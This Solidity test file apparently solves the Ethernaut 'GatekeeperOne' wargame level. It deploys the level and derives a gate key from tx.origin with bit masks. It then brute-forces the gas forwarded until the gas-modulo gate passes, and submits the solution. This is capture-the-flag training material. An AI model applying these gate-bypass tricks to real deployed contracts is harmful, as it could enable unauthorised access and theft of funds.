pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/GatekeeperOne/GatekeeperOneHack.sol";
import "../../src/GatekeeperOne/GatekeeperOneFactory.sol";
import "../../src/Ethernaut.sol";
import "../utils/vm.sol";

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bytes8 data = bytes8(uint64(uint16(uint160(tx.origin)))); //p3 & p1
        data |= 0xff00000000000000;//p2

        //spam gate two with many gas options until it works
        for (uint i = 20000; i < 20000 + 8191; i++) {
            try ethernautGatekeeperOne.enter{gas: i}(data) {} catch {}
        }
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}